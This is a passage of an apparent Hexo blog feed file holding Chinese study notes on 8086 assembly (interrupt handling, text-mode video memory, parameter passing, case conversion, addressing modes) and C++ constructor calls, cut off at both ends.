class="line">jne int9ret</span><br><span class="line"></span><br><span class="line">mov ax, 0B800H</span><br><span class="line">mov es, ax</span><br><span class="line">inc byte ptr es:[160*12+40*2+1]</span><br><span class="line"></span><br><span class="line">int9ret:</span><br><span class="line">pop es</span><br><span class="line">pop bx</span><br><span class="line">pop ax</span><br><span class="line">iret</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汇编学习】int n的具体步骤</title>
      <link href="/2024/03/16/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91int%20n%E7%9A%84%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4/"/>
      <url>/2024/03/16/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91int%20n%E7%9A%84%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4/</url>
      
        <content type="html"><![CDATA[<p>int n：</p><ol><li>get n</li><li>pushf</li><li>TF &#x3D; 0, IF &#x3D; 0</li><li>push cs</li><li>push IP</li><li>(IP) &#x3D; 4 * n, (CS) &#x3D; 4 * n + 2</li></ol><p>​; 中断处理程序</p><ol start="7"><li>pop IP</li><li>pop CS</li><li>popf</li></ol><p>4,5,6可归为 call dword ptr ds:[0]</p><p>7,8,9可归为 iret</p><p>3的具体步骤为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pushf</span><br><span class="line">pop ax</span><br><span class="line">and ah, 11111100b</span><br><span class="line">push ax</span><br><span class="line">popf</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汇编学习】汇编屏幕显示字符</title>
      <link href="/2024/03/13/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E6%B1%87%E7%BC%96%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E5%AD%97%E7%AC%A6/"/>
      <url>/2024/03/13/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E6%B1%87%E7%BC%96%E5%B1%8F%E5%B9%95%E6%98%BE%E7%A4%BA%E5%AD%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p><strong>CPU</strong>对所有控件统一编址，而显存的地址空间为 <strong>A0000H</strong> ~ <strong>BFFFFH</strong>（128K RAM）<br>其中 <strong>B8000H</strong> ~ <strong>BFFFFH</strong>，共 32K 的空间，是 80 * 25 的彩色字符模式  </p><p>在8086cpu中屏幕被分为 <strong>25行，80列</strong>，每个单位存放一个字符数据，一个字符数据需要 <strong>2</strong> 个字节<br>所以一行需要 <strong>160</strong> 个字节</p><table><thead><tr><th align="center">各行所需字节数</th><th align="center">显示缓冲区地址范围</th></tr></thead><tbody><tr><td align="center">160(A0H)</td><td align="center">B800:0000 ~ B800:009F</td></tr><tr><td align="center">160(A0H)</td><td align="center">B800:00A0 ~ B800:013F</td></tr><tr><td align="center">160(A0H)</td><td align="center">B800:0140 ~ B800:01DF</td></tr><tr><td align="center">……</td><td align="center">…..</td></tr><tr><td align="center">160(A0H)</td><td align="center">B800:0F00 ~ B800:0F9F</td></tr></tbody></table><p>一个字符数据为什么需要 2 个字节呢？<br>低位字节存放<strong>要显示符号的ASCII</strong>，高位字节存放<strong>显示属性字节</strong><br>高位字节具体情况：</p><table><thead><tr><th align="center">7</th><th align="center">6</th><th align="center">5</th><th align="center">4</th><th align="center">3</th><th align="center">2</th><th align="center">1</th><th align="center">0</th></tr></thead><tbody><tr><td align="center">BL</td><td align="center">R</td><td align="center">G</td><td align="center">B</td><td align="center">I</td><td align="center">R</td><td align="center">G</td><td align="center">B</td></tr><tr><td align="center">闪烁</td><td align="center">背景</td><td align="center">背景</td><td align="center">背景</td><td align="center">高亮</td><td align="center">前景</td><td align="center">前景</td><td align="center">前景</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data</span><br><span class="line">data segment</span><br><span class="line">db &quot;welcome to masm!&quot;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax, data</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ax, 0B800H ; 显存地址段</span><br><span class="line">mov es, ax </span><br><span class="line">mov si, 0</span><br><span class="line">mov di, 160*12+80-16 ; 目标显存偏移地址</span><br><span class="line">                         ; 让字符显示在中间行中间列</span><br><span class="line"></span><br><span class="line">mov cx, 16</span><br><span class="line">  s:mov al, [si]</span><br><span class="line">  mov es:[di], al</span><br><span class="line">  inc di</span><br><span class="line">  mov al, 71H ; 规定字符的显示属性</span><br><span class="line">  mov es:[di], al</span><br><span class="line">  inc si</span><br><span class="line">  inc di</span><br><span class="line">  loop s</span><br><span class="line"></span><br><span class="line">  mov ax, 4c00h</span><br><span class="line">  int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汇编学习】汇编传参和函数返回问题</title>
      <link href="/2024/03/11/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E6%B1%87%E7%BC%96%E4%BC%A0%E5%8F%82%E5%92%8C%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E9%97%AE%E9%A2%98/"/>
      <url>/2024/03/11/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E6%B1%87%E7%BC%96%E4%BC%A0%E5%8F%82%E5%92%8C%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>问题1：根据提供的N，计算N的3次方</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">cube:</span><br><span class="line">mov ax, bx</span><br><span class="line">mul bx</span><br><span class="line">mul bx</span><br><span class="line">ret</span><br><span class="line">start:</span><br><span class="line">mov bx, 2 ; 寄存器传参</span><br><span class="line">call cube ; 寄存器存结果在dx, ax中</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>问题2：计算data段中第一组数据的3次方，结果保存在后面一组dword单元中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">dw 1,2,3,4,5,6,7,8 ; 8个字，16个字节</span><br><span class="line">dd 0,0,0,0,0,0,0,0 ; 8个双字，32个字节</span><br><span class="line">data ends</span><br><span class="line">cube:</span><br><span class="line">mov ax, bx</span><br><span class="line">mul bx</span><br><span class="line">mul bx</span><br><span class="line">ret</span><br><span class="line">start:</span><br><span class="line">mov ax, data</span><br><span class="line">mov ds, ax</span><br><span class="line"></span><br><span class="line">mov si, 0 ; 存储偏移地址的变量</span><br><span class="line">mov di, 16 ; 存储偏移地址的变量</span><br><span class="line"></span><br><span class="line">mov cx, 8</span><br><span class="line"> s:mov bx, [si] ; 寄存器传参</span><br><span class="line"> call cube ; 寄存器存结果，在dx、ax中</span><br><span class="line"> mov [di], ax</span><br><span class="line"> mov [di].2, dx</span><br><span class="line"> add si, 2</span><br><span class="line"> add di, 4</span><br><span class="line"> loop s</span><br><span class="line"> </span><br><span class="line"> mov ax, 4c00h</span><br><span class="line"> int 21h</span><br><span class="line">code segment</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>问题3：将data段中的字符串转化为大写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code, ds:data</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">db &quot;conversation&quot;,0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax, data</span><br><span class="line">mov ds, ax</span><br><span class="line"></span><br><span class="line">mov si, 0 ; 寄存器传参</span><br><span class="line">call capital ; 不需要结果 void</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">capital:</span><br><span class="line">mov cl, [si]</span><br><span class="line">mov ch, 0</span><br><span class="line">jcxz ok</span><br><span class="line">and byte ptr [si], 11011111b</span><br><span class="line">inc si</span><br><span class="line">jmp short capital</span><br><span class="line"> ok:ret</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>问题4：计算(a - b)^3^，a、b为word型数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax, 1</span><br><span class="line">push ax ; 栈传参</span><br><span class="line">mov ax, 3</span><br><span class="line">push ax ; 栈传参</span><br><span class="line">call difcube ; 寄存器存结果，在dx、ax中</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">difcube:</span><br><span class="line">push bp ; 保存现场</span><br><span class="line">mov bp, sp</span><br><span class="line">mov ax, [bp+4]</span><br><span class="line">sub ax, [bp+6]</span><br><span class="line">mov bp, ax</span><br><span class="line">mul bp</span><br><span class="line">mul bp</span><br><span class="line">pop bp ; 还原现场</span><br><span class="line">ret 4 ; 1.pop ip 2.add sp, 4</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汇编学习】大小写转换问题</title>
      <link href="/2024/03/08/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2%E9%97%AE%E9%A2%98/"/>
      <url>/2024/03/08/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg, ds:datasg</span><br><span class="line"></span><br><span class="line">datasg segment</span><br><span class="line">db &quot;BaSiC&quot;</span><br><span class="line">db &quot;iNfOrMaTiOn&quot;</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">start:mov ax, datasg</span><br><span class="line">mov ds, ax ; 定义数据段地址</span><br><span class="line"></span><br><span class="line">mov bx, 0</span><br><span class="line">mov cx, 5</span><br><span class="line">s:mov al, [bx] ; 小写转大写循环</span><br><span class="line">and al, 11011111B ; 把第3位变成0,其它位不变</span><br><span class="line">mov [bx], al</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov bx, 0</span><br><span class="line">mov cx, 11</span><br><span class="line">s0:mov al, [bx] ; 大写转小写循环</span><br><span class="line">or al, 00100000B ; 把第3位变成1,其它位不变</span><br><span class="line">mov [bx], al</span><br><span class="line">inc bx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>简单讲述一下原理，我们知道在 <strong>ASCII</strong> 表中，大写字母与小写字母相差 <strong>20H</strong> ，体现在二进制中就是 <strong>0010 0000</strong> ，大写字母的二进制表示如果加上这个二进制数就是小写字母的二进制表示，这无非就是只在第 3 位数（从左往右）上加上 1，巧的是所有大写字母的第 3 位数字都是 0，所以，可以得出在 <strong>ASCII</strong> 表中，大写字母与小写字母的差别就是第 3 位数上 0 和 1 的区别。看下下面这张表会更清晰</p><p><img src="/../posts_img/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2%E9%97%AE%E9%A2%98/00.png" alt="00"></p><p>在将 <strong>小写</strong> 转 <strong>大写</strong> 时，只需要保证第 <strong>3</strong> 位为 <code>0</code> 其它位保持不变即可，所以<code>and 1101 1111B</code></p><p>在将 <strong>大写</strong> 转 <strong>小写</strong> 时，只需要保证第 <strong>3</strong> 位为 <code>1</code> 其它位保持不变即可，所以<code>or 0010 0000B</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汇编学习】对内存的不同寻址方式</title>
      <link href="/2024/03/08/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E5%AF%B9%E5%86%85%E5%AD%98%E7%9A%84%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F/"/>
      <url>/2024/03/08/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E5%AF%B9%E5%86%85%E5%AD%98%E7%9A%84%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>名称</th><th>形式</th><th>特点</th><th>意义</th><th>示例</th></tr></thead><tbody><tr><td>直接寻址</td><td>[idata]</td><td>用一个常量&#x2F;立即数来表示地址</td><td>用于直接定位一个内存单元</td><td>mov ax, [200]</td></tr><tr><td>寄存器间接寻址</td><td>[bx]</td><td>用一个变量来表示内存地址</td><td>用于间接定位一个内存单元</td><td>mov bx, 0<br/>mov ax, [bx]</td></tr><tr><td>寄存器相对寻址</td><td>1.[bx+idata]<br />2.[bx].idata<br />3.idata[bx]</td><td>用一个变量和常量表示地址</td><td>可在一个起始地址的基础上用变量间接一个内存单元。这个相对是寄存器相对idata，符合逻辑的写法是[idata+bx]</td><td>mov ax, [bx+200]<br /></td></tr><tr><td>基址变址寻址</td><td>1.[bx+si]<br />2.[bx][si]</td><td>用bx和变址寄存器表示地址</td><td></td><td>mov ax,[bx+si]<br /></td></tr><tr><td>相对基址变址寻址</td><td>1.[bx+si+idata]<br />2.[bx][si].idata<br />3.idata[bx][si]</td><td>用两个常量和一个变量表示地址</td><td></td><td>mov ax,[bx+si+idata]</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【汇编学习】如何写出最简单的汇编程序</title>
      <link href="/2024/03/06/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E5%A6%82%E4%BD%95%E5%86%99%E5%87%BA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%B1%87%E7%BC%96%E7%A8%8B%E5%BA%8F/"/>
      <url>/2024/03/06/%E3%80%90%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E3%80%91%E5%A6%82%E4%BD%95%E5%86%99%E5%87%BA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%B1%87%E7%BC%96%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>例：用汇编求2 ^ 3</p><ol><li><p>定义一个段</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code segment</span><br><span class="line"></span><br><span class="line">code ends ; 注意有 &#x27;s&#x27;</span><br></pre></td></tr></table></figure></li><li><p>在段中编写具体的汇编指令</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">code segment</span><br><span class="line">mov ax, 2</span><br><span class="line">add ax, ax</span><br><span class="line">add ax, ax</span><br><span class="line">code ends</span><br></pre></td></tr></table></figure></li><li><p>指出程序在何结束</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code segment</span><br><span class="line">mov ax, 2</span><br><span class="line">add ax, ax</span><br><span class="line">add ax, ax</span><br><span class="line">code ends</span><br><span class="line">end ; 注意没有 &#x27;s&#x27;</span><br></pre></td></tr></table></figure></li><li><p>段与段寄存器关联</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax, 2</span><br><span class="line">add ax, ax</span><br><span class="line">add ax, ax</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li><p>加上程序返回指令（套路，类似 <strong>return 0</strong>)</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax, 2</span><br><span class="line">add ax, ax</span><br><span class="line">add ax, ax</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure></li></ol><p>其它示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 123H, 0455H, 0789H, 0abcH, 0defH, 0fedH, 0cbaH, 0987H</span><br><span class="line">; 在代码段的开始定义了 8 个字，占据 16 个字节</span><br><span class="line"></span><br><span class="line">start:mov bx, 0  ; &#x27;start&#x27; 自定义程序起始标签</span><br><span class="line">mov ax, 0</span><br><span class="line">mov cx, 8</span><br><span class="line"></span><br><span class="line">s:add, ax, cs:[bx] ; &#x27;s&#x27;是循环起始标签</span><br><span class="line">add bx, 2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start ; end 除了通知编译器程序结束外，还通知了编译器程序的入口在什么地方</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语言编译过程</title>
      <link href="/2024/03/05/%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
      <url>/2024/03/05/%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h4 id="汇编语言编译过程"><a href="#汇编语言编译过程" class="headerlink" title="汇编语言编译过程"></a>汇编语言编译过程</h4><p><img src="/../posts_img/%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png"></p><hr><h4 id="C语言编译过程"><a href="#C语言编译过程" class="headerlink" title="C语言编译过程"></a>C语言编译过程</h4><p><img src="/../posts_img/%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/C%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png"></p><hr><h4 id="Java编译过程"><a href="#Java编译过程" class="headerlink" title="Java编译过程"></a>Java编译过程</h4><p><img src="/../posts_img/%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/Java%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 汇编 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++构造函数的调用方式</title>
      <link href="/2024/03/04/C++%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2024/03/04/C++%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Entity</span>() &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Default Constructor&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Entity</span>(<span class="type">int</span>) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Parameter Constructor&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Entity</span>(<span class="type">const</span> Entity&amp; other) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Copy Constructor&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 括号法</span></span><br><span class="line">    Entity e;</span><br><span class="line">    <span class="function">Entity <span class="title">e1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">    <span class="function">Entity <span class="title">e2</span><span class="params">(e)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显式调用法</span></span><br><span class="line">    Entity e3 = <span class="built_in">Entity</span>();</span><br><span class="line">    Entity e4 = <span class="built_in">Entity</span>(<span class="number">10</span>);</span><br><span class="line">    Entity e5 = <span class="built_in">Entity</span>(e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 隐式调用法</span></span><br><span class="line">    Entity e6 = <span class="number">10</span>;</span><br><span class="line">    Entity e7 = e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++函数返回对象时的拷贝构造函数与临时变量</title>
      <link href="/2024/02/23/C++%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%AF%B9%E8%B1%A1%E6%97%B6%E7%9A%84%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%8E%E4%B8%B4%E6%97%B6%E5%8F%98%E9%87%8F/"/>
      <url>/2024/02/23/C++%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%AF%B9%E8%B1%A1%E6%97%B6%E7%9A%84%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E4%B8%8E%E4%B8%B4%E6%97%B6%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<p>本次测试文件<code>test.cpp</code></p><p>为了避免**RVO（return value optimization）**带来的影响，本次测试用<code>g++</code>编译文件时都会带上<code>-fno-elide-constructors</code>选项来关闭<code>RVO</code></p><p>每次的编译命令均为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">g++ test.cpp -o <span class="built_in">test</span> -fno-elide-constructors</span></span><br></pre></td></tr></table></figure><p>本次测试包含头文件如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br></pre></td></tr></table></figure><p>测试所使用的类如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 